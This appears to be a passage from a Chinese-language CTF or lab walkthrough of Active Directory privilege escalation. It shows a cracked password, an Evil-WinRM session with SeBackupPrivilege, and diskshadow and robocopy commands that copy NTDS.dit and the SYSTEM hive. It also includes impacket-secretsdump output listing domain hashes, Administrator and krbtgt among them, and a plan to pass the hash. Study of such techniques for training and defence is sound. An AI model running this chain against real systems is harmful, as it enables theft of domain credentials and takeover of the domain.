0fa744547ebb95a113ca9e79d2d0a7d541dab772985e6dc84f1f890227d51aa63e8def3f6543db3729671efb489ba75771dd18034bc9b6a5722adf1c4bf9fee2019d7669017c1715259e866eb2e7261c9b5dc00c7a9afd4a720cae0893809b4662cca38f8047c26148d60c00f4d684d34751749942e31eff39d65da340964a983518bc90586b29a5c3e5ccf9a819b2f0b05063b92972ce13665ebf7156d57acbd7c59f24b6f9bcb979ab701d7de88ce3162974904dd396360074c58401cf2daae9974737f085fee2186f0aec7d41ecbc2f9bf673950cc66b6a9dfffa8bee30c7149f147b58996a94086292fcc5dff045421f516675126c687a3d5048237af24b13d0952f2cb064481dbe89215273b96d8886601ebc3b4ab4f0be723aeb934606f3915e206815dc5e767774d84f832279c8f1b3a27bebe21199cfa5af42cc9d11afd0542e43384cc0b9ed7b02062b4f2d3dbe62cf664e031b07601b9d1bf42ca7c09f96377e26355b40fc9306e6281f17b0f8b21ba67c4cf7a4c615077e2d7ec0a0a83c2ee3217e47d9fe649ff64a8c4c23e72b19ad049bdbdf05a9c721ded93f428679acc035f28289d2fe065fe3b6a56a0ec48e398874f675fe8b82e08635152fdf196ba9043dbbd:DPQSXSXgh2
```

拿到凭据tianjing/DPQSXSXgh2，正常非管理用户都不能rdp的，何况还有个flag没拿，tianjing绝对不是域管

### 卷影拷贝

```
*Evil-WinRM* PS C:\Users\tianjing\Documents> whoami /priv

特权信息
----------------------

特权名                        描述             状态
============================= ================ ======
SeMachineAccountPrivilege     将工作站添加到域 已启用
SeBackupPrivilege             备份文件和目录   已启用
SeRestorePrivilege            还原文件和目录   已启用
SeShutdownPrivilege           关闭系统         已启用
SeChangeNotifyPrivilege       绕过遍历检查     已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集   已启用
```

这里我当时在想和前面那个本地提权一样应该也能，但是需要个rdp的页面，显然做不到，不知道是不是这个原因才放弃SeRestorePrivilege 的


|文件|作用|是否必需|
|---|---|---|
|**NTDS.dit**|域数据库，**所有域用户/机器/服务账户哈希**|✅ 必需|
|**SYSTEM**|包含 **boot key**，用于解密 NTDS.dit 里的哈希|✅ 必需|
|SAM|本机账户|❌ 域控上没意义|
|SECURITY|包含 LSA secrets 等|⚠️ 可选，一般不需要|

```powershell
Remove-Item C:\Windows\Temp\file.dsh -Force -ErrorAction SilentlyContinue
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'set metadata C:\Windows\Temp\meta.cab' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'set context persistent nowriters' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'add volume c: alias ntds' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'create' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'expose %ntds% z:' -Encoding ASCII
```

```powershell
diskshadow /s C:\Windows\Temp\file.dsh
```


```powershell

robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
robocopy /b Z:\Windows\System32\config C:\Windows\Temp SYSTEM

这里绝对路径会有问题推荐还是进到目录直接拷贝，包括接下来下载最好都是进到目录
```


```powershell
download C:\Windows\Temp\ntds.dit /tmp/test/ntds.dit
download C:\Windows\Temp\SYSTEM /tmp/test/SYSTEM
```

解密
```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 8cca939cb8a94a304d33209b41a99517
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
XR-DC$:1000:aad3b435b51404eeaad3b435b51404ee:28b508bccbc765e1779134fc309ee161:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4b2afb57dd0833ee9ed732ea89c263a3:::
```

接下来直接winrm hash传递即可